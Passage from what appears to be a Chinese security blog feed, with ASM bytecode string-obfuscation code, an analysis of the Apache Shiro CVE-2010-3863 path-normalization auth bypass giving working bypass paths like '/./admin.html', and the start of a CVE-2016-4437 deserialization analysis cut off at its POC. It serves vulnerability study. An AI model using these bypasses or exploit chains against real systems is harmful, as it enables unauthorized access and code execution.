class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor1</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor1</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 拦截字符串修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor1</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor1</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodVisitor</span>(api,<span class="built_in">super</span>.visitMethod(access,name,desc,signature,exceptions)) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLdcInsn</span><span class="params">(Object cst)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(cst <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = ((String) cst).getBytes(StandardCharsets.UTF_8);<span class="comment">//转换bytes</span></span><br><span class="line">                    mv.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">                    mv.visitInsn(DUP);</span><br><span class="line">                    mv.visitIntInsn(SIPUSH,bytes.length);</span><br><span class="line">                    mv.visitIntInsn(NEWARRAY,T_BYTE);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;bytes.length;i++)&#123;</span><br><span class="line">                        mv.visitInsn(DUP);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,i);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,bytes[i]);</span><br><span class="line">                        mv.visitInsn(AASTORE);</span><br><span class="line">                    &#125;</span><br><span class="line">                    mv.visitLdcInsn(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    mv.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;([BLjava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">super</span>.visitLdcInsn(cst);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串转换成bytes</p>]]></content>
      
      
      <categories>
          
          <category> java security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2010-3863权限绕过分析</title>
      <link href="/2022/11/10/CVE-2010-3863/"/>
      <url>/2022/11/10/CVE-2010-3863/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2010-3863权限绕过分析"><a href="#CVE-2010-3863权限绕过分析" class="headerlink" title="CVE-2010-3863权限绕过分析"></a>CVE-2010-3863权限绕过分析</h1><h2 id="初识shiro"><a href="#初识shiro" class="headerlink" title="初识shiro"></a>初识shiro</h2><blockquote><p><strong>Apache Shiro™</strong>是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。</p></blockquote><p>从官方简介中可以得知 shiro 是一套权限管理框架，在 shiro 框架中有以下三个核心概念模块：<code>Subject</code>、<code>SecurityManger</code>和<code>Realms</code><img src="images/image-20210418162523103.png" alt="image-20210418162523103"></p><ul><li><code>Subject</code>：当前正在执行的用户</li><li><code>SecurityManger</code>：安全管理器，管理所有用户的操作，是 shiro 架构的核心</li><li><code>Realm</code>：封装数据源，充当 shiro 与应用程序安全数据之间的桥梁，当需要与安全相关的数据(如用户帐户)进行实际交互以执行身份验证(登录)和授权(访问控制)时，为其提供身份验证或者授权。</li></ul><p>因此一次 请求—&gt; 认证 —&gt; 授权的流程为：</p><ol><li>web 应用程序获取当前的<code>Subject</code>并调用该<code>Subject</code>的校验方法；</li><li><code>Subject</code>传递校验到<code>SecurityManger</code>进行处理并进行判断；</li><li><code>SecurityManger</code>调用<code>Realm</code>获取配置信息，通过该配置信息判断当前的<code>Subject</code>所属角色是否能够进行操作。</li></ol><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>该漏洞环境已经上传到 github 仓库上：<a href="https://github.com/dota-st/vulnEnv">https://github.com/dota-st/vulnEnv</a><br><img src="images/image-20221017113541029.png" alt="image-20221017113541029"></p><p>首先在配置文件<code>realm.ini</code>中定义了用户账号密码以及对应角色权限<br><img src="images/image-20221017113620512.png" alt="image-20221017113620512"></p><p>ShiroConfig<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> IniRealm <span class="title function_">getIniRealm</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IniRealm</span>(<span class="string">&quot;classpath:realm.ini&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(Realm realm)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>(realm);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * anon：无需认证就可以访问</span></span><br><span class="line"><span class="comment">     * authc：必须认证才能访问</span></span><br><span class="line"><span class="comment">     * user：必须拥有记住我功能才能访问</span></span><br><span class="line"><span class="comment">     * perms：拥有某个资源的权限才能访问</span></span><br><span class="line"><span class="comment">     * role：拥有某个角色的权限才能访问</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">        bean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        LinkedHashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;/admin.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/user.html&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(map);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>UserController<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/doLogin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doLoginPage</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="meta">@RequestParam(&quot;password&quot;)</span> String password, <span class="meta">@RequestParam(name=&quot;rememberme&quot;, defaultValue=&quot;&quot;)</span> String rememberMe)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ShiroUtil.login(username, password))&#123;</span><br><span class="line">            <span class="keyword">if</span>(ShiroUtil.hasRole(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;redirect:/admin.html&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ShiroUtil.hasRole(<span class="string">&quot;user&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;redirect:/user.html&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/unauth.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value=&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">helloPage</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/login.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>影响版本：shiro &lt; 1.1.0</p><p>shiro 使用<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()</code>方法获取和调用执行的<code>filter</code><br><img src="images/image-20221017161045663.png" alt="image-20221017161045663"></p><p>在上图中可以看到，通过<code>getPathWithinApplication()</code>方法获取到我们传入的请求路径<code>/./admin.html</code>，接着通过<code>filterChainManager.getChainNames()</code>方法取出我们的配置<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[/admin.html, /user.html, /**]</span><br></pre></td></tr></table></figure></p><p>我们这里跟进一下<code>getPathWithinApplication()</code>方法<br><img src="images/image-20221017161803921.png" alt="image-20221017161803921"></p><p>继续跟进<code>getPathWithinApplication()</code>方法<br><img src="images/image-20221017161912839.png" alt="image-20221017161912839"></p><p>在<code>getRequestUri()</code>方法中返回了<code>/./admin.html</code>，继续跟进<code>getRequestUri()</code>方法<br><img src="images/image-20221017162105007.png" alt="image-20221017162105007"></p><p>最后会 return 到<code>decodeAndCleanUriString()</code>方法，继续跟进该方法<br><img src="images/image-20221017162648547.png" alt="image-20221017162648547"></p><p>首先对 URL 进行 URL 解码，并对<code>;</code>进行截取，查了一下</p><blockquote><p><code>decodeAndCleanUriString()</code> 是 URL Decode 及针对 JBoss/Jetty 等中间件在 url 处添加 <code>;jsessionid</code> 之类的字符串的适配，对 <code>;</code> 进行了截取。</p></blockquote><p>接下来<code>getChain()</code>方法往下走进行<code>while</code>循环，通过<code>pathMatches()-&gt;pathMatcher.matches()</code>方法进行匹配<br><img src="images/image-20221017164449628.png" alt="image-20221017164449628"></p><p>通过前面对请求处理的跟踪，可以发现在匹配之前没有对传进来的<code>URL</code>进行标准化路径处理，如果构造一下请求路径就有可能绕过权限校验。</p><p>回顾一下，我们的配置如下所示，设置<code>admin.html</code>文件只有<code>amdin</code>用户角色才能访问，同时设置<code>/**</code>为<code>anon</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">    ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">        bean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        LinkedHashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;/admin.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/user.html&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(map);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>访问<code>admin.html</code>，因为没有<code>admin</code>权限，校验失败故 302 跳转到了<code>login.html</code><br><img src="images/image-20221017114715110.png" alt="image-20221017114715110"></p><p>访问<code>/./admin.html</code>或者<code>/aa/../admin.html</code>，在<code>while</code>循环中，与前面的<code>/admin.html</code>和<code>/user.html</code>匹配失败，进而进入了<code>/**</code>的匹配范围，成功访问到<code>admin.html</code>文件<br><img src="images/image-20221017114807826.png" alt="image-20221017114807826"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-4437漏洞分析</title>
      <link href="/2022/11/10/CVE-2016-4437/"/>
      <url>/2022/11/10/CVE-2016-4437/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2016-4437漏洞分析"><a href="#CVE-2016-4437漏洞分析" class="headerlink" title="CVE-2016-4437漏洞分析"></a>CVE-2016-4437漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2016-4437 是 Shiro 历史漏洞中比较著名的一个，官方编号为 Shiro-550。</p><p>影响版本：Shiro  &lt; 1.2.5</p><p>漏洞描述：如果程序未能正确配置 “remember me” 功能所使用的密钥。攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Shiro 在 0.9 版本开始提供 RememberMe 模块，用于应用程序记录登录用户凭证的功能。</p><h3 id="RememberMeManager"><a href="#RememberMeManager" class="headerlink" title="RememberMeManager"></a>RememberMeManager</h3><p><code>org.apache.shiro.mgt.RememberMeManager</code>接口提供了以下五个方法：</p><ul><li><code>getRememberedPrincipals()</code>：RememberMe 的功能，在指定上下文中寻找记录的<code>principals</code>。</li><li><code>forgetIdentity()</code>：忘记用户身份标识。</li><li><code>onSuccessfulLogin()</code>：登录校验成功时调用，保存当前用户的<code>principals</code>以供应用程序以后调用。</li><li><code>onFailedLogin()</code>：登录校验失败时调用，忘记当前用户的<code>principals</code>。</li><li><code>onLogout()</code>：用户退出登录时调用，忘记当前用户的<code>principals</code>。</li></ul><h3 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h3><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code>是实现<code>RememberMeManger</code>接口类的抽象类，这里有几个比较重要的成员变量需要了解：</p><ul><li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个硬编码 AES KEY，该 KEY 会被设置为加解密 KEY 的成员变量（encryptionCipherKey/decryptionCipherKey）。</li><li><code>serializer</code>：Shiro 的序列化器，用来对序列化和反序列化标识用户身份的<code>PrincipalCollection</code>对象。</li><li><code>cipherService</code>：用于数据加解密的类，实际上是<code>org.apache.shiro.crypto.AesCipherService</code>类。</li></ul><h3 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h3><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>类在 Shiro 中实现使用 Cookie 记录用户身份信息的功能，比较值得关注的方法为<code>getRememberedSerializedIdentity()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext)subjectContext;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isIdentityRemoved(wsc)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line">                <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> <span class="built_in">this</span>.getCookie().readValue(request, response);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;deleteMe&quot;</span>.equals(base64)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    base64 = <span class="built_in">this</span>.ensurePadding(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> decoded;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在该方法中，主要实现了获取 Cookie 中的内容并通过 Base64 解码，然后返回 byte 数组的功能。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞环境已经上传到 github 中：<a href="https://github.com/dota-st/vulnEnv">https://github.com/dota-st/vulnEnv</a></p><p>先简单了解一下该漏洞的原理：</p><p>当用户登录勾选<code>remember me</code>的时候，Shiro 会将当前用户的 Cookie 信息序列化后进行 AES 加密存储在 Cookie 的 RememberMe 字段中，在下次请求时会读取 Cookie 中的 RememberMe 字段并进行 AES 解密然后反序列化。<br><img src="images/image-20221018155429239.png" alt="image-20221018155429239"></p><p>然而通过前面的<code>AbstractRememberMeManager</code>类我们知道，AES 加解密的 KEY 是硬编码在该类中的，因此当我们知道 KEY之后，可以伪造 RememberMe 字段进而触发反序列化漏洞。</p><p>那么我们便开始一步步跟着调试吧，打上断点，在 Cookie 添加 RememberMe 字段然后发送请求。</p><p>在<code>#getRememberedPrincipals()</code>方法中将上下文数据传入到<code>getRememberedSerializedIdentity()</code>方法中<br><img src="images/image-20221018111741540.png" alt="image-20221018111741540"></p><p>接着会跳转到<code>CookieRememberMeManager#getRememberedSerializedIdentity()</code>方法中<br><img src="images/image-20221018155851444.png" alt="image-20221018155851444"></p><p>可以看到<code>readValue()</code>方法会从请求中获取<code>RememberMe</code>字段的值，最后通过<code>Base64.decode()</code>解码后返回 byte 数组，接着又回到<code>getRememberedPrincipals()</code>方法<br><img src="images/image-20221018160049461.png" alt="image-20221018160049461"></p><p>继续跟进<code>convertBytesToPrincipals()</code>方法，调用<code>decrypt()</code>方法进行解密<br><img src="images/image-20221018160159474.png" alt="image-20221018160159474"></p><p>继续跟进<code>decrypt()</code>方法<br><img src="images/image-20221018160308176.png" alt="image-20221018160308176"></p><p>这里调用到<code>getDecryptionCipherKey()</code>方法，我们跟进一下<br><img src="images/image-20221018162044495.png" alt="image-20221018162044495"></p><p>这里到了<code>AbstractRememberMeManager#getDecryptionCipherKey()</code>方法，前面我们提到过该类，在这里获取到了硬编码的秘钥。</p><p>接着<code>decrypt()</code>方法走完 return 了<code>serialized</code>字节数组，最后调用了<code>deserialize()</code>方法<br><img src="images/image-20221018162427231.png" alt="image-20221018162427231"></p><p>继续跟进<code>deserialize()</code>方法，跟着调用了<code>getSerializer().deserialize()</code>方法<br><img src="images/image-20221018162530315.png" alt="image-20221018162530315"></p><p>继续跟进<code>getSerializer().deserialize()</code>方法<br><img src="images/image-20221018162715157.png" alt="image-20221018162715157"></p><p>可以看到，这里通过<code>ByteArrayInputStream()</code>获取了输入流，最后调用<code>readObject()</code>方法进行反序列化。</p><p>回顾梳理一下流程：</p><ol><li>传入<code>RememberMe</code>字段，获取该字段的值；</li><li>对<code>RememberMe</code>进行 Base64 解码，然后调用硬编码的 KEY 进行解密；</li><li>对解密后的内容进行反序列化。</li></ol><h2 id="编写-POC"><a href="#编写-POC" class="headerlink" title="编写 POC"></a>编写 POC</h2><p>在 pom.xml 文件里添加了<code>CommonCollections</code>和<code>javassist</code>依赖，以完成反序列化的利用演示。<br><img src="images/image-20221018163306620.png" alt="image-20221018163306620"></p><p>这里通过前面我们学习的<code>CommonsCollections11</code>链子生成恶意文件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 